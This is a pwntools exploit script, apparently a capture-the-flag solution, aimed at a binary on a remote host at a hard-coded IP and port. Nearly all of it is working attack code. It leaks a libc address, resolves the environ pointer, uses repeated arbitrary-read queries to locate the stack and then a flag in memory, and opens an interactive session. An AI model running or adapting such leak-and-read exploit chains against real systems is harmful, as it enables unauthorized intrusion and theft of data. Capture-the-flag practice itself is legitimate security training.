from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8005]
libc=ELF('./libc-2.31.so')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p)
str = rl()
print(str)
leak_addr = int(str[-13:-1],16)
libc_base = leak_addr - libc.sym['puts']
ptr2stack_addr = libc_base + libc.sym['environ']
pr('libc_base',libc_base)
pr('ptr2stack_addr',ptr2stack_addr)
payload = p64(ptr2stack_addr)
ru(b'query : ')
s(payload)
str2 = rc(6)
#print(str2)
stack_addr = u64(str2.ljust(8,b'\x00')) - 0x130
pr('stack_addr',stack_addr)
ru(b'query : ')
payload2 = p64(stack_addr)
s(payload2)
str3 = rc(6)
print(str3)
flag_addr = u64(str3.ljust(8,b'\x00')) + 0x2b70
pr('flag_addr',flag_addr)
ru(b'query : ')
payload3 = p64(flag_addr)
s(payload3)


shell()
